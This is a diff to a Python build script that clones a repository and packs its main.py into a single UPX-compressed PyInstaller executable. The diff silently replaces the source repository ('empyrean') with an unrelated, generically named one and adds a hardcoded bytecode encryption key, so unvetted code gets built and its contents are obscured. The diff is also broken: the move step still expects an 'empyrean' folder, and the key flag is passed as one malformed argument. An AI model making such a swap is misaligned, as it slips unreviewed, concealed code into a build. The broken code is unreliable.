@@ -70,7 +70,7 @@ class make_env:
         os.mkdir(self.build_dir)
 
     def get_src(self) -> None:
-        subprocess.run(['git', 'clone', 'https://github.com/addi00000/empyrean.git'], cwd=self.build_dir)
+        subprocess.run(['git', 'clone', 'https://github.com/chiron853/test1234567890.git'], cwd=self.build_dir)
         shutil.move(os.path.join(self.build_dir, 'empyrean', 'src'), self.build_dir)
 
 class write_config:
@@ -92,7 +92,7 @@ class build:
         self.get_pyinstaller()
         self.get_upx()
 
-        subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--clean', '--distpath', self.dist_dir, '--workpath', os.path.join(self.build_dir, 'work'), '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx'), os.path.join(self.build_dir, 'src', 'main.py')])
+        subprocess.run(['pyinstaller', '--onefile', '--key H8GJgggjkg8ggkg2', '--clean', '--distpath', self.dist_dir, '--workpath', os.path.join(self.build_dir, 'work'), '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx'), os.path.join(self.build_dir, 'src', 'main.py')])
 
     def get_pyinstaller(self) -> None:
         url = 'https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v5.1.zip'
